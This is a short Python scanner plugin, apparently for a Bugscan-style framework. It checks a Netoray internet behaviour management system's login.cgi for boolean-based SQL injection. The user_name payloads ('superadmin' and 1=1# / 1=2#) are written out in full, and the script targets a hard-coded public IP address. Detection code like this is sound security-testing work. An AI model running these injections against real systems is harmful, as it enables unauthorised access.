#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0140998
import urlparse
def assign(service, arg):
    if service == "netoray_nsg":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
        
def audit(arg):
    url = arg + "login.cgi?act=login&user_name=superadmin%27%20and%201=1%23&user_pwd=123&lang=zh_CN.UTF-8&t=0.4357823623300646&loginflag=1&ajax_rnd=33058189799063725952&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
    code, head, res1, errcode, _ = curl.curl2(url)
    url = arg + "login.cgi?act=login&user_name=superadmin%27%20and%201=2%23&user_pwd=123&lang=zh_CN.UTF-8&t=0.4357823623300646&loginflag=1&ajax_rnd=33058189799063725952&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
    code, head, res2, errcode, _ = curl.curl2(url)
    if code==200 and '密码错误!' in res1 and '帐号不存在!' in res2:
        security_hole("莱克斯科技上网行为管理系统通用注入:%s"%url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('netoray_nsg', 'https://60.30.2.74/')[1])